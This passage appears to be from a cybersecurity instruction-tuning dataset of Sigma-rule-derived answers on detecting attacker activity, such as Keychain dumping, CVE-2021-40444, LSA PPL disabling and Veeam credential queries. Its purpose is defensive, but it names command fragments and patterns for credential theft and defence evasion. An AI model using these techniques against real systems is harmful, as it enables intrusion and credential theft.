      "answer": "In order to detect potential exploitation of CVE-2021-40444 via suspicious process patterns seen in in-the-wild exploitations, you should: Monitor the creation of processes on Windows systems with a focus on instances where 'control.exe' is the launched process. Special attention should be paid to situations where 'control.exe' is initiated by parent processes such as 'winword.exe' (Microsoft Word), 'powerpnt.exe' (Microsoft PowerPoint), or 'excel.exe' (Microsoft Excel). However, instances where the command line ends with '\\control.exe input.dll' or '\\control.exe\" input.dll' should be excluded from this scrutiny, as they are not relevant to this specific detection strategy. The presence of 'control.exe' being launched in this manner without these exclusions signals a high-risk activity that could indicate the exploitation of the CVE-2021-40444 vulnerability, leveraging Office applications to initiate potentially malicious processes."
    }
  },
  {
    "instruction": "How can I detect: passwords dumps from Keychain",
    "context": "",
    "output": "In order to detect passwords dumps from Keychain, you should: Monitor the creation of processes on macOS systems focusing on those initiated by the '/usr/bin/security' executable. Watch specifically for command lines that include 'find-certificate' and ' export ', which could indicate an attempt to extract certificates from the system's keychain. Also, be alert for commands containing ' dump-keychain ' and ' login-keychain ', as these are indicative of efforts to dump or access login data stored within macOS Keychain. It's crucial to evaluate these detections carefully, considering that some may stem from legitimate administrative activities. The severity of these activities is deemed medium, given the potential security implications of unauthorized access to stored passwords and certificate data.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "passwords dumps from Keychain",
      "answer": "In order to detect passwords dumps from Keychain, you should: Monitor the creation of processes on macOS systems focusing on those initiated by the '/usr/bin/security' executable. Watch specifically for command lines that include 'find-certificate' and ' export ', which could indicate an attempt to extract certificates from the system's keychain. Also, be alert for commands containing ' dump-keychain ' and ' login-keychain ', as these are indicative of efforts to dump or access login data stored within macOS Keychain. It's crucial to evaluate these detections carefully, considering that some may stem from legitimate administrative activities. The severity of these activities is deemed medium, given the potential security implications of unauthorized access to stored passwords and certificate data."
    }
  },
  {
    "instruction": "Can you explain how to detect: Malleable Amazon Profile",
    "context": "",
    "output": "Certainly!\n\nIn order to detect Malleable Amazon Profile, you should: Focus on monitoring web proxy logs for specific patterns of behavior that could indicate manipulation or malicious activity related to Amazon profiles. Specifically, look for web traffic that has the following characteristics: \n\n1. The User-Agent string matches 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko', which is commonly used by web browsers but can be mimicked by scripts or tools attempting to disguise malicious traffic as legitimate.\n\n2. The method of the request is either 'GET' or 'POST'. The 'GET' method is specifically used to request data from the specified resource, '/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books', at 'www.amazon.com' and may include a cookie that ends with '=csm-hit=s-24KU11BB82RZSYGJ3BDK|1419899012996'. This could indicate an attempt to search or manipulate Amazon book listings or profiles in a manner not typical of standard user behavior.\n\n3. Alternatively, the 'POST' method targeting the resource '/N4215/adj/amzn.us.sr.aps' at 'www.amazon.com' might be observed. This action could represent attempts to post data to Amazon services, possibly for the purpose of profile manipulation or to interact with Amazon's systems in another unsanctioned way.\n\nGiven the high level of concern and the specific nature of these detections, they are tagged with relevant MITRE ATT&CK tactics and techniques commonly associated with Credential Access and Discovery, although specific tags are not mentioned. Be aware that there might be false positives, as some legitimate activities could inadvertently match these patterns under unknown circumstances. Continuous monitoring and analysis of proxy logs for these behaviors are crucial to identifying potential malleable Amazon profile activities.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Malleable Amazon Profile",
      "answer": "In order to detect Malleable Amazon Profile, you should: Focus on monitoring web proxy logs for specific patterns of behavior that could indicate manipulation or malicious activity related to Amazon profiles. Specifically, look for web traffic that has the following characteristics: \n\n1. The User-Agent string matches 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko', which is commonly used by web browsers but can be mimicked by scripts or tools attempting to disguise malicious traffic as legitimate.\n\n2. The method of the request is either 'GET' or 'POST'. The 'GET' method is specifically used to request data from the specified resource, '/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books', at 'www.amazon.com' and may include a cookie that ends with '=csm-hit=s-24KU11BB82RZSYGJ3BDK|1419899012996'. This could indicate an attempt to search or manipulate Amazon book listings or profiles in a manner not typical of standard user behavior.\n\n3. Alternatively, the 'POST' method targeting the resource '/N4215/adj/amzn.us.sr.aps' at 'www.amazon.com' might be observed. This action could represent attempts to post data to Amazon services, possibly for the purpose of profile manipulation or to interact with Amazon's systems in another unsanctioned way.\n\nGiven the high level of concern and the specific nature of these detections, they are tagged with relevant MITRE ATT&CK tactics and techniques commonly associated with Credential Access and Discovery, although specific tags are not mentioned. Be aware that there might be false positives, as some legitimate activities could inadvertently match these patterns under unknown circumstances. Continuous monitoring and analysis of proxy logs for these behaviors are crucial to identifying potential malleable Amazon profile activities."
    }
  },
  {
    "instruction": "Can you explain how to detect: abuse of the cron utility to perform task scheduling for initial or recurring execution of malicious code. Detection will focus on crontab jobs uploaded from the tmp folder.",
    "context": "",
    "output": "Certainly!\n\nIn order to detect abuse of the cron utility to perform task scheduling for initial or recurring execution of malicious code, you should: monitor for the creation of processes on Linux systems where the process image name ends with 'crontab'. Particularly, focus on instances where the command line used to initiate these processes includes a reference to the '/tmp/' directory. This detection strategy aims at identifying attempts to schedule tasks, potentially for malicious purposes, through the cron utility using files or scripts located in the temporary directory. It's important to note that there might be instances of legitimate administration activities that involve crontab and the /tmp/ directory, which could result in false positives. Therefore, a medium level of scrutiny is advised when analyzing alerts generated by this detection strategy. The associated MITRE ATT&CK tactics and techniques include Execution and Persistence, specifically through scheduled tasks/jobs indicating an abuse of the system's task scheduling utility.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "abuse of the cron utility to perform task scheduling for initial or recurring execution of malicious code. Detection will focus on crontab jobs uploaded from the tmp folder.",
      "answer": "In order to detect abuse of the cron utility to perform task scheduling for initial or recurring execution of malicious code, you should: monitor for the creation of processes on Linux systems where the process image name ends with 'crontab'. Particularly, focus on instances where the command line used to initiate these processes includes a reference to the '/tmp/' directory. This detection strategy aims at identifying attempts to schedule tasks, potentially for malicious purposes, through the cron utility using files or scripts located in the temporary directory. It's important to note that there might be instances of legitimate administration activities that involve crontab and the /tmp/ directory, which could result in false positives. Therefore, a medium level of scrutiny is advised when analyzing alerts generated by this detection strategy. The associated MITRE ATT&CK tactics and techniques include Execution and Persistence, specifically through scheduled tasks/jobs indicating an abuse of the system's task scheduling utility."
    }
  },
  {
    "instruction": "Can you explain how to detect: creation of new \".dll\" files inside the plugins directory of a notepad++ installation by a process other than \"gup.exe\". Which could indicates possible persistence",
    "context": "",
    "output": "Certainly!\n\nIn order to detect creation of new \".dll\" files inside the plugins directory of a notepad++ installation by a process other than \"gup.exe\", which could indicate possible persistence, you should: Monitor Windows file event logs for any new \".dll\" files being created or added to the Notepad++ plugins directory. This detection focuses on identifying \".dll\" files because these can be utilized by adversaries to maintain persistence on a compromised system by executing malicious code. Important to note, any occurrences where the process responsible for creating or modifying these \".dll\" files is not 'gup.exe', the updater for Notepad++, should be scrutinized. The rule specifically excludes files added or modified by 'gup.exe', as well as during initial installation procedures or when sourcing from 'C:\\Users\\' within '\\AppData\\Local\\Temp\\' directory, aiming to reduce false positives such as legitimate updates or plugin expansions initiated by users. Detection of such activity is flagged with a medium level of concern due to the potential misuse of legitimate software to sustain unauthorized access or control within a targeted environment. Be aware, legitimate use of custom plugins or initial installation of Notepad++ may also trigger alerts under this criterion, which are considered potential false positives.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "creation of new \".dll\" files inside the plugins directory of a notepad++ installation by a process other than \"gup.exe\". Which could indicates possible persistence",
      "answer": "In order to detect creation of new \".dll\" files inside the plugins directory of a notepad++ installation by a process other than \"gup.exe\", which could indicate possible persistence, you should: Monitor Windows file event logs for any new \".dll\" files being created or added to the Notepad++ plugins directory. This detection focuses on identifying \".dll\" files because these can be utilized by adversaries to maintain persistence on a compromised system by executing malicious code. Important to note, any occurrences where the process responsible for creating or modifying these \".dll\" files is not 'gup.exe', the updater for Notepad++, should be scrutinized. The rule specifically excludes files added or modified by 'gup.exe', as well as during initial installation procedures or when sourcing from 'C:\\Users\\' within '\\AppData\\Local\\Temp\\' directory, aiming to reduce false positives such as legitimate updates or plugin expansions initiated by users. Detection of such activity is flagged with a medium level of concern due to the potential misuse of legitimate software to sustain unauthorized access or control within a targeted environment. Be aware, legitimate use of custom plugins or initial installation of Notepad++ may also trigger alerts under this criterion, which are considered potential false positives."
    }
  },
  {
    "instruction": "How can I detect: backup catalog deletions",
    "context": "",
    "output": "In order to detect backup catalog deletions, you should focus on monitoring application logs specifically within Windows environments. Look for events with an EventID of 524, which is associated with actions performed by the Microsoft-Windows-Backup provider. The occurrence of this event indicates an operation related to the deletion of backup catalogs, which can be an activity of concern, potentially linked to malicious intentions to undermine data recoverability or to obscure unauthorized data access or removal. It's important to note that while detections on this event could signal malicious activity, they could also register as false positives, meaning not every detected instance will correlate to a deleterious action. The severity of detecting such events is considered medium, suggesting that while it's not always indicative of an immediate threat, it warrants investigation to ensure the security and integrity of backup data.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "backup catalog deletions",
      "answer": "In order to detect backup catalog deletions, you should focus on monitoring application logs specifically within Windows environments. Look for events with an EventID of 524, which is associated with actions performed by the Microsoft-Windows-Backup provider. The occurrence of this event indicates an operation related to the deletion of backup catalogs, which can be an activity of concern, potentially linked to malicious intentions to undermine data recoverability or to obscure unauthorized data access or removal. It's important to note that while detections on this event could signal malicious activity, they could also register as false positives, meaning not every detected instance will correlate to a deleterious action. The severity of detecting such events is considered medium, suggesting that while it's not always indicative of an immediate threat, it warrants investigation to ensure the security and integrity of backup data."
    }
  },
  {
    "instruction": "Please help me detect the following: Show when a monitor or a span/rspan is setup or modified",
    "context": "",
    "output": "Sure!\nIn order to show when a monitor or a span/rspan is setup or modified, you should monitor Cisco AAA (Authentication, Authorization, and Accounting) service logs for specific command occurrences. Detecting this activity involves looking for logs containing any of the following phrases: \"monitor capture point\", \"set span\", or \"set rspan\". These commands are pivotal in configuring or changing monitoring settings that could indicate either legitimate administrative activities or potential unauthorized network monitoring setup by attackers.\n\nThe detection process primarily focuses on the command set (CmdSet) field within the logs, identifying any instance of the aforementioned keywords. It is important to bear in mind that these detections could sometimes trigger on legitimate administrative actions. Instances where administrators are setting up new monitoring points, modifying existing spans, or utilizing monitor commands for troubleshooting purposes are considered normal operations and therefore, can be marked as false positives. This necessitates a thorough review of the context in which these commands are executed to discern between routine maintenance and potential security incidents.\n\nThis approach is designed to safeguard against unauthorized network surveillance activities, aligning with the understanding and mitigation efforts against certain tactics and techniques cataloged by MITRE ATT&CK, specifically those involving the manipulation of network monitoring tools to eavesdrop or gather data unlawfully. By scrutinizing logs for these specific commands, organization can bolster their cyber defense mechanism against such adversarial tactics.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Show when a monitor or a span/rspan is setup or modified",
      "answer": "In order to show when a monitor or a span/rspan is setup or modified, you should monitor Cisco AAA (Authentication, Authorization, and Accounting) service logs for specific command occurrences. Detecting this activity involves looking for logs containing any of the following phrases: \"monitor capture point\", \"set span\", or \"set rspan\". These commands are pivotal in configuring or changing monitoring settings that could indicate either legitimate administrative activities or potential unauthorized network monitoring setup by attackers.\n\nThe detection process primarily focuses on the command set (CmdSet) field within the logs, identifying any instance of the aforementioned keywords. It is important to bear in mind that these detections could sometimes trigger on legitimate administrative actions. Instances where administrators are setting up new monitoring points, modifying existing spans, or utilizing monitor commands for troubleshooting purposes are considered normal operations and therefore, can be marked as false positives. This necessitates a thorough review of the context in which these commands are executed to discern between routine maintenance and potential security incidents.\n\nThis approach is designed to safeguard against unauthorized network surveillance activities, aligning with the understanding and mitigation efforts against certain tactics and techniques cataloged by MITRE ATT&CK, specifically those involving the manipulation of network monitoring tools to eavesdrop or gather data unlawfully. By scrutinizing logs for these specific commands, organization can bolster their cyber defense mechanism against such adversarial tactics."
    }
  },
  {
    "instruction": "Please help me detect the following: Octopus Scanner Malware.",
    "context": "",
    "output": "Sure!\nIn order to detect Octopus Scanner Malware, you should: Monitor file events on Windows systems, focusing on operations involving specific target filenames. Watch for activities such as the creation, modification, or deletion involving files with the paths ending in '\\AppData\\Local\\Microsoft\\Cache134.dat' or '\\AppData\\Local\\Microsoft\\ExplorerSync.db'. These specific file paths are indicative of Octopus Scanner Malware activity on a system. Since false positives are currently unknown, any detection based on these criteria should be treated with a high level of suspicion and investigated promptly.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Octopus Scanner Malware.",
      "answer": "In order to detect Octopus Scanner Malware, you should: Monitor file events on Windows systems, focusing on operations involving specific target filenames. Watch for activities such as the creation, modification, or deletion involving files with the paths ending in '\\AppData\\Local\\Microsoft\\Cache134.dat' or '\\AppData\\Local\\Microsoft\\ExplorerSync.db'. These specific file paths are indicative of Octopus Scanner Malware activity on a system. Since false positives are currently unknown, any detection based on these criteria should be treated with a high level of suspicion and investigated promptly."
    }
  },
  {
    "instruction": "Explain how should I detect the following: pattern of UAC Bypass using a msconfig GUI hack (UACMe 55)",
    "context": "",
    "output": "In order to detect the pattern of UAC Bypass using a msconfig GUI hack (UACMe 55), you should: Monitor for file events in Windows, specifically focusing on actions related to files named 'pkgmgr.exe' within any user's 'AppData\\Local\\Temp' directory. This detection is critical due to the technique utilizing this specific path and filename as part of an attempt to bypass User Account Control (UAC), a security measure in Windows. Elements to watch include the initiation or alteration of 'pkgmgr.exe' located precisely at 'C:\\Users\\[Any User]\\AppData\\Local\\Temp\\'. While assessing this activity, it is important to be thorough yet cautious, as there could be instances where similar patterns emerge without malicious intent, though such cases are currently unknown. The elevated severity level of this rule underscores the potential risk associated with this behavior, which aligns with tactics and techniques of evading security mechanisms.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "pattern of UAC Bypass using a msconfig GUI hack (UACMe 55)",
      "answer": "In order to detect the pattern of UAC Bypass using a msconfig GUI hack (UACMe 55), you should: Monitor for file events in Windows, specifically focusing on actions related to files named 'pkgmgr.exe' within any user's 'AppData\\Local\\Temp' directory. This detection is critical due to the technique utilizing this specific path and filename as part of an attempt to bypass User Account Control (UAC), a security measure in Windows. Elements to watch include the initiation or alteration of 'pkgmgr.exe' located precisely at 'C:\\Users\\[Any User]\\AppData\\Local\\Temp\\'. While assessing this activity, it is important to be thorough yet cautious, as there could be instances where similar patterns emerge without malicious intent, though such cases are currently unknown. The elevated severity level of this rule underscores the potential risk associated with this behavior, which aligns with tactics and techniques of evading security mechanisms."
    }
  },
  {
    "instruction": "Can you explain how to detect: execution of renamed paexec via imphash and executable product string",
    "context": "",
    "output": "Certainly!\n\nIn order to detect execution of renamed paexec via imphash and executable product string, you should monitor Windows process creation events for specific indicators that signal an execution attempt of the PAExec tool under a different name. The detection criteria focus on identifying executions based on the product name containing 'PAExec', or by matching the unique imphash values associated with this utility.\n\nFour specific imphash values are critical for this detection:\n- 11D40A7B7876288F919AB819CC2D9802\n- 6444f8a34e99b8f7d9647de66aabe516\n- dfd6aa3f7b2b1035b76b718f1ddc689f\n- 1a6cca4d5460b1710a12dea39e4a592c\n\nAdditionally, any process creation events where hashes match any of the listed IMPhash values, indicating the execution of a file with the same characteristics as PAExec, should be considered potentially malicious.\n\nTo reduce false positives and ensure accuracy, any process creation event where the image name contains 'paexec' should be excluded from alerts, under the assumption that legitimate instances of PAExec use the original name, and thus, are not indicative of the specific attack tactic being monitored for.\n\nThis approach is designed to flag potentially malicious activity associated with the execution of utilities similar to PAExec that may be used in various stages of an attack, including lateral movement and system control, without relying solely on file names, which can easily be altered by attackers. It's essential to consider that due to the potential for unknown false positives, thorough investigation and correlation with other suspicious activities within the environment are recommended upon detection.\n\nMonitoring for these criteria aligns with recognizing tactics and techniques such as Execution and Command and Control, which are consistent with the behavior of attackers attempting to use administrative tools for malicious purposes within an environment.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "execution of renamed paexec via imphash and executable product string",
      "answer": "In order to detect execution of renamed paexec via imphash and executable product string, you should monitor Windows process creation events for specific indicators that signal an execution attempt of the PAExec tool under a different name. The detection criteria focus on identifying executions based on the product name containing 'PAExec', or by matching the unique imphash values associated with this utility.\n\nFour specific imphash values are critical for this detection:\n- 11D40A7B7876288F919AB819CC2D9802\n- 6444f8a34e99b8f7d9647de66aabe516\n- dfd6aa3f7b2b1035b76b718f1ddc689f\n- 1a6cca4d5460b1710a12dea39e4a592c\n\nAdditionally, any process creation events where hashes match any of the listed IMPhash values, indicating the execution of a file with the same characteristics as PAExec, should be considered potentially malicious.\n\nTo reduce false positives and ensure accuracy, any process creation event where the image name contains 'paexec' should be excluded from alerts, under the assumption that legitimate instances of PAExec use the original name, and thus, are not indicative of the specific attack tactic being monitored for.\n\nThis approach is designed to flag potentially malicious activity associated with the execution of utilities similar to PAExec that may be used in various stages of an attack, including lateral movement and system control, without relying solely on file names, which can easily be altered by attackers. It's essential to consider that due to the potential for unknown false positives, thorough investigation and correlation with other suspicious activities within the environment are recommended upon detection.\n\nMonitoring for these criteria aligns with recognizing tactics and techniques such as Execution and Command and Control, which are consistent with the behavior of attackers attempting to use administrative tools for malicious purposes within an environment."
    }
  },
  {
    "instruction": "Explain how should I detect the following: curl process start on linux, which indicates a file download from a remote location or a simple web request to a remote server",
    "context": "",
    "output": "In order to detect a curl process start on linux, which indicates a file download from a remote location or a simple web request to a remote server, you should: Monitor process creation logs on Linux systems for instances where the process being started ends with '/curl'. This activity may suggest an attempt to download files from a remote location or make web requests to remote servers, which could be benign or malicious depending on the context. However, it is important to note that there might be false positives, such as scripts created by developers and admins as well as legitimate administrative activity. The severity of this rule is considered low, given that not all instances of curl usage are malicious but warrant attention to discern the intent behind the usage.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "curl process start on linux, which indicates a file download from a remote location or a simple web request to a remote server",
      "answer": "In order to detect a curl process start on linux, which indicates a file download from a remote location or a simple web request to a remote server, you should: Monitor process creation logs on Linux systems for instances where the process being started ends with '/curl'. This activity may suggest an attempt to download files from a remote location or make web requests to remote servers, which could be benign or malicious depending on the context. However, it is important to note that there might be false positives, such as scripts created by developers and admins as well as legitimate administrative activity. The severity of this rule is considered low, given that not all instances of curl usage are malicious but warrant attention to discern the intent behind the usage."
    }
  },
  {
    "instruction": "How can I detect: access to a protected_storage service over the network. Potential abuse of DPAPI to extract domain backup keys from Domain Controllers",
    "context": "",
    "output": "In order to detect access to a protected_storage service over the network, potentially indicating abuse of DPAPI to extract domain backup keys from Domain Controllers, you should: monitor Windows Security logs for event ID 5145, which signifies a network share object was accessed. Specifically, focus on instances where the ShareName includes 'IPC' and the RelativeTargetName matches 'protected_storage'. This activity signifies that an actor might be attempting to interact with the protected storage service over the network, potentially to misuse the Data Protection API (DPAPI) and extract valuable domain backup keys from a Domain Controller. This is considered a high-level threat, although it's important to be aware that not all occurrences might represent malicious activity \u2013 hence, some alerts might turn out to be false positives. Nevertheless, such attempts align with techniques related to credential access and could point towards an advanced actor's footprint in your network environment.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "access to a protected_storage service over the network. Potential abuse of DPAPI to extract domain backup keys from Domain Controllers",
      "answer": "In order to detect access to a protected_storage service over the network, potentially indicating abuse of DPAPI to extract domain backup keys from Domain Controllers, you should: monitor Windows Security logs for event ID 5145, which signifies a network share object was accessed. Specifically, focus on instances where the ShareName includes 'IPC' and the RelativeTargetName matches 'protected_storage'. This activity signifies that an actor might be attempting to interact with the protected storage service over the network, potentially to misuse the Data Protection API (DPAPI) and extract valuable domain backup keys from a Domain Controller. This is considered a high-level threat, although it's important to be aware that not all occurrences might represent malicious activity \u2013 hence, some alerts might turn out to be false positives. Nevertheless, such attempts align with techniques related to credential access and could point towards an advanced actor's footprint in your network environment."
    }
  },
  {
    "instruction": "How can I detect: Detect unix shell configuration modification. Adversaries may establish persistence through executing malicious commands triggered when a new shell is opened.",
    "context": "",
    "output": "In order to detect Unix shell configuration modification, where adversaries might be establishing persistence by executing malicious commands triggered when a new shell is opened, you should focus on monitoring specific system and user files within Linux environments. This involves tracking any changes or accesses to critical shell configuration files through the Audit daemon (auditd) service which is common in Linux systems.\n\nSpecial attention should be given to files that are instrumental in the initial setup and configuration of shells on the system. These include global configuration files such as `/etc/shells`, `/etc/profile`, and `/etc/bash.bashrc`, as well as user-specific files like `/root/.bashrc` and `/home/*/.bashrc`. The list extends to cover configurations for different shell types, including Bash, Zsh, and Csh, across both global and user-level settings. \n\nMonitoring should be applied to the accessing or modification of these files:\n- Global shell configurations: `/etc/shells`, `/etc/profile`, `/etc/profile.d/*`, `/etc/bash.bashrc`, `/etc/bashrc`, `/etc/zsh/zprofile`, `/etc/zsh/zshrc`, `/etc/zsh/zlogin`, `/etc/zsh/zlogout`, `/etc/csh.cshrc`, and `/etc/csh.login`.\n- Root user shell configurations: `/root/.bashrc`, `/root/.bash_profile`, `/root/.profile`, `/root/.zshrc`, and `/root/.zprofile`.\n- General user shell configurations: Files under `/home/*/`, including `.bashrc`, `.zshrc`, `.bash_profile`, `.zprofile`, `.profile`, `.bash_login`, `.bash_logout`, `.zlogin`, and `.zlogout`.\n\nIt is anticipated that some benign actions performed by administrators or users, such as legitimate changes to shell profiles or rc files, could trigger alerts; these are to be considered potential false positives. However, any modification to these critical files should be closely investigated to ensure they do not correspond to adversarial actions attempting to gain persistence or execute unauthorized commands upon shell startup. \n\nThis monitoring approach integrates with Linux's auditd service to provide a methodological observation of crucial shell configuration files, aiming to identify any unauthorized or suspicious modifications that could indicate adversary activity. The security level for these kinds of detections is generally treated as medium, acknowledging the potential risk these modifications could pose if they are indeed malicious.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Detect unix shell configuration modification. Adversaries may establish persistence through executing malicious commands triggered when a new shell is opened.",
      "answer": "In order to detect Unix shell configuration modification, where adversaries might be establishing persistence by executing malicious commands triggered when a new shell is opened, you should focus on monitoring specific system and user files within Linux environments. This involves tracking any changes or accesses to critical shell configuration files through the Audit daemon (auditd) service which is common in Linux systems.\n\nSpecial attention should be given to files that are instrumental in the initial setup and configuration of shells on the system. These include global configuration files such as `/etc/shells`, `/etc/profile`, and `/etc/bash.bashrc`, as well as user-specific files like `/root/.bashrc` and `/home/*/.bashrc`. The list extends to cover configurations for different shell types, including Bash, Zsh, and Csh, across both global and user-level settings. \n\nMonitoring should be applied to the accessing or modification of these files:\n- Global shell configurations: `/etc/shells`, `/etc/profile`, `/etc/profile.d/*`, `/etc/bash.bashrc`, `/etc/bashrc`, `/etc/zsh/zprofile`, `/etc/zsh/zshrc`, `/etc/zsh/zlogin`, `/etc/zsh/zlogout`, `/etc/csh.cshrc`, and `/etc/csh.login`.\n- Root user shell configurations: `/root/.bashrc`, `/root/.bash_profile`, `/root/.profile`, `/root/.zshrc`, and `/root/.zprofile`.\n- General user shell configurations: Files under `/home/*/`, including `.bashrc`, `.zshrc`, `.bash_profile`, `.zprofile`, `.profile`, `.bash_login`, `.bash_logout`, `.zlogin`, and `.zlogout`.\n\nIt is anticipated that some benign actions performed by administrators or users, such as legitimate changes to shell profiles or rc files, could trigger alerts; these are to be considered potential false positives. However, any modification to these critical files should be closely investigated to ensure they do not correspond to adversarial actions attempting to gain persistence or execute unauthorized commands upon shell startup. \n\nThis monitoring approach integrates with Linux's auditd service to provide a methodological observation of crucial shell configuration files, aiming to identify any unauthorized or suspicious modifications that could indicate adversary activity. The security level for these kinds of detections is generally treated as medium, acknowledging the potential risk these modifications could pose if they are indeed malicious."
    }
  },
  {
    "instruction": "Please help me detect the following: usage of the \"reg.exe\" utility to disable PPL protection on the LSA process",
    "context": "",
    "output": "Sure!\nIn order to detect the usage of the \"reg.exe\" utility to disable PPL protection on the LSA process, you should: Monitor the creation of processes across Windows systems, focusing on instances where the \"reg.exe\" utility is involved. Specifically, look for processes whose image (executable path) ends with '\\reg.exe' or where the original file name is identified explicitly as 'reg.exe'. Further hone in on command line arguments connected to the Registry Editor actions that target the \u2018SYSTEM\\CurrentControlSet\\Control\\Lsa\u2019 path. These actions are particularly suspicious when they include a combination of adding a new entry (' add '), setting a value to 0 (' /d 0'), and involving the 'RunAsPPL' parameter (' /v RunAsPPL '). All these conditions must be met to trigger an alert. Given the specificity of these indicators, false positives are unlikely, and such detection should be treated with a high level of concern due to its implications on system security by tampering with Protected Process Light (PPL) configurations.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "usage of the \"reg.exe\" utility to disable PPL protection on the LSA process",
      "answer": "In order to detect the usage of the \"reg.exe\" utility to disable PPL protection on the LSA process, you should: Monitor the creation of processes across Windows systems, focusing on instances where the \"reg.exe\" utility is involved. Specifically, look for processes whose image (executable path) ends with '\\reg.exe' or where the original file name is identified explicitly as 'reg.exe'. Further hone in on command line arguments connected to the Registry Editor actions that target the \u2018SYSTEM\\CurrentControlSet\\Control\\Lsa\u2019 path. These actions are particularly suspicious when they include a combination of adding a new entry (' add '), setting a value to 0 (' /d 0'), and involving the 'RunAsPPL' parameter (' /v RunAsPPL '). All these conditions must be met to trigger an alert. Given the specificity of these indicators, false positives are unlikely, and such detection should be treated with a high level of concern due to its implications on system security by tampering with Protected Process Light (PPL) configurations."
    }
  },
  {
    "instruction": "How can I detect: loading of diagcab packages from a remote path, as seen in DogWalk vulnerability",
    "context": "",
    "output": "In order to detect loading of diagcab packages from a remote path, as seen in DogWalk vulnerability, you should focus on monitoring diagnosis-scripted services on Windows systems. Specifically, you should look for event ID 101, which may indicate an attempt to load a diagcab package. A critical sign of a potential attack involves the PackagePath field containing double backslashes, suggesting a remote path is being used, such as in cases where the path looks similar to '\\\\webdav-test.herokuapp.com@ssl\\DavWWWRoot\\package'. This pattern is a strong indicator of a potential exploitation attempt, given that diagcab packages should not typically be loaded from remote locations in a secure environment.\n\nHowever, it is important to note that not all instances flagged by these criteria are malicious. Legitimate scenarios may include packages hosted on known and authorized remote locations. Therefore, while the detection level is high, indicating a serious concern, careful analysis and verification of the context in which these diagcab packages are being loaded from remote paths are essential to reduce the risk of false positives.\n\nThis analysis connects to various tactics and techniques, emphasizing the importance of vigilance in monitoring and controlling diagnostic scripts and remote package loading activities as part of a comprehensive cybersecurity strategy.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "loading of diagcab packages from a remote path, as seen in DogWalk vulnerability",
      "answer": "In order to detect loading of diagcab packages from a remote path, as seen in DogWalk vulnerability, you should focus on monitoring diagnosis-scripted services on Windows systems. Specifically, you should look for event ID 101, which may indicate an attempt to load a diagcab package. A critical sign of a potential attack involves the PackagePath field containing double backslashes, suggesting a remote path is being used, such as in cases where the path looks similar to '\\\\webdav-test.herokuapp.com@ssl\\DavWWWRoot\\package'. This pattern is a strong indicator of a potential exploitation attempt, given that diagcab packages should not typically be loaded from remote locations in a secure environment.\n\nHowever, it is important to note that not all instances flagged by these criteria are malicious. Legitimate scenarios may include packages hosted on known and authorized remote locations. Therefore, while the detection level is high, indicating a serious concern, careful analysis and verification of the context in which these diagcab packages are being loaded from remote paths are essential to reduce the risk of false positives.\n\nThis analysis connects to various tactics and techniques, emphasizing the importance of vigilance in monitoring and controlling diagnostic scripts and remote package loading activities as part of a comprehensive cybersecurity strategy."
    }
  },
  {
    "instruction": "Explain how should I detect the following: dump of credentials in VeeamBackup dbo",
    "context": "",
    "output": "In order to detect dump of credentials in VeeamBackup dbo, you should: look for the creation of processes on Windows systems where the process image name ends with '\\sqlcmd.exe'. This is particularly important because the command line used for launching the process includes key elements indicative of a suspicious query, specifically those containing 'SELECT', 'TOP', and '[VeeamBackup].[dbo].[Credentials]'. These elements suggest an attempt to query and possibly exfiltrate credentials from the VeeamBackup database. Such activities are flagged with a high level of concern due to their potential link to tactics and techniques associated with credential access and exfiltration. It's important to monitor for these signs while also being aware that there may be legitimate use cases that could trigger false positives, although these instances are unknown.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "dump of credentials in VeeamBackup dbo",
      "answer": "In order to detect dump of credentials in VeeamBackup dbo, you should: look for the creation of processes on Windows systems where the process image name ends with '\\sqlcmd.exe'. This is particularly important because the command line used for launching the process includes key elements indicative of a suspicious query, specifically those containing 'SELECT', 'TOP', and '[VeeamBackup].[dbo].[Credentials]'. These elements suggest an attempt to query and possibly exfiltrate credentials from the VeeamBackup database. Such activities are flagged with a high level of concern due to their potential link to tactics and techniques associated with credential access and exfiltration. It's important to monitor for these signs while also being aware that there may be legitimate use cases that could trigger false positives, although these instances are unknown."
    }
  },
  {
    "instruction": "How can I detect: presence of a potentially xor encoded powershell command",
    "context": "",
